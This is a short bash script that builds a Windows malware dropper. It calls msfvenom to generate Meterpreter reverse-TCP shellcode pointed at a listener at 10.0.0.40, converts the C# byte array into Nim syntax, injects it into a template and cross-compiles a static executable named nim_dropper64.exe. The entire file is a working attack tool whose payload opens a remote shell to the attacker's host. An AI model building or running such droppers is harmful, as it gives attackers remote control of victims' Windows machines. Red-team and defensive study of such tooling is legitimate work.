#!/bin/bash

SC=`msfvenom -p windows/x64/meterpreter_reverse_tcp -f csharp  --platform windows --arch x64 LHOST=10.0.0.40`

# Replae relevant lines
ORIG="byte[] buf = new byte["
FIX="var shellcode: array["
SC=${SC/$ORIG/$FIX}
SC=${SC/]/,byte] =  }
SC=${SC/\}/]}
SC=${SC/{/\[ byte }
SC=${SC/;/}
SC=${SC/\[ \[/\[}
SC=${SC//[$'\n']}
CODE=`cat nim.template`
CODE=${CODE/INJECTHERE/$SC}
echo "$CODE" > dropper.nim

nim c -d=mingw -b=cpp --passL="-static-libgcc -static-libstdc++" --app=console --cpu=amd64 --out=/tmp/nim_dropper64.exe dropper.nim
